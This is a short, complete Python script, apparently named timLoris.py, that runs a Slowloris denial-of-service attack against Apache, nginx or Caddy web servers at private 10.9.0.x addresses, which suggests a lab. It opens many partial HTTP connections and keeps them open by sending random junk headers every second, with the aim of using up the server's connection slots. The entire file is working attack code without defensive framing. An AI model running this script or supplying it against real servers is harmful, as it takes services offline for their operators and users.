import socket, random, sys, time

sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6)...Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...Chrome/54.0.2840.71 Safari/537.36",
]

victim_hosts = {"apache":"10.9.0.5", "nginx":"10.9.0.8", "caddy":"10.9.0.9"}

def create_socket(IP, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(4)
    s.connect((IP, port))
    s.send(f"GET /nonexistent?{random.randint(1,10000)} HTTP/1.1\r\n".encode())
    s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
    s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
    return s

def slowloris(victim_type, port, socket_count):
    IP = victim_hosts[victim_type]
    try:
        while True:
            for _ in range(socket_count - len(sockets)):
                try:
                    s = create_socket(IP, port)
                    sockets.append(s)
                    print(f"[+] New socket. Total: {len(sockets)}")
                except Exception as e:
                    print("[-] Error:", e)
                    break

            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except Exception as e:
                    sockets.remove(s)
            time.sleep(1) # Increase header sending frequency significantly

    except KeyboardInterrupt:
        print("Attack stopped by user.")

if __name__ == "__main__":
    if len(sys.argv) != 4 or sys.argv[1] not in victim_hosts:
        print("Usage: python timLoris.py <apache|nginx|caddy> <Port> <Socket Count>")
        sys.exit(1)

    slowloris(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

